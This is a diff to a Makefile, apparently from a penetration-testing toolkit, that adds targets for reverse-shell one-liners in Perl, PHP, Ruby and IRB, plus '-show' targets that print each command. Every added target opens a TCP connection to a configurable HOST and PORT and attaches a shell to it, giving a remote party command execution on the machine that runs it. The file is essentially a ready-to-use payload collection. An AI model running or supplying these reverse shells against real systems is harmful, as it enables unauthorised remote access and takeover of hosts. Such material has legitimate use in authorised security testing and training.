@@ -146,6 +146,46 @@ openssl-show:
 
 ############################################################
 
+########################### PERL ###########################
+
+perl:
+	perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(SHELL)");};'
+
+perl-show:
+	@printf "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\")))){ open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(SHELL)\");};'\n"
+
+############################################################
+
+############################ PHP ###########################
+
+php:
+	php -r '$$sock=fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'
+
+php-show:
+	@printf "php -r '\$$sock=fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+############################################################
+
+########################### RUBY ###########################
+
+ruby:
+	ruby -rsocket -e 'exit if fork; c=TCPSocket.new("$(HOST)",$(PORT)); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
+
+ruby-show:
+	@printf "ruby -rsocket -e 'exit if fork; c=TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'\n"
+
+############################################################
+
+############################ IRB ###########################
+
+irb:
+	echo 'require "socket"; exit if fork; c=TCPSocket.new("$(HOST)",$(PORT)); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
+
+irb-show:
+	echo 'require \"socket\"; exit if fork; c=TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end' | irb
+
+############################################################
+
 ########################### NODE ###########################
 
 node:
